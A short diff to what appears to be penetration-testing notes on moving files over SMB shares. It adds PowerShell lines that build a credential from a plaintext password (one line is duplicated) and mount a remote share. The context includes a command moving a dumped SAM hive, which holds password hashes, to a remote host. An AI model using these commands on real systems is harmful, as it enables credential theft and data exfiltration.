@@ -10,6 +10,10 @@ net use x: \\<IP>\share /user:guest <password>
 #Download
 cmd /c "copy file.txt X:\"
 move sam.save \\10.10.15.16\CompData
+
+$pass = convertto-securestring 'staphy' -AsPlainText -Force
+$pass = convertto-securestring 'staphy' -AsPlainText -Force
+New-PSDrive -Name "staphy" -PSProvider "FileSystem" -Root "\\<IP>\Public"
 ```
 
 
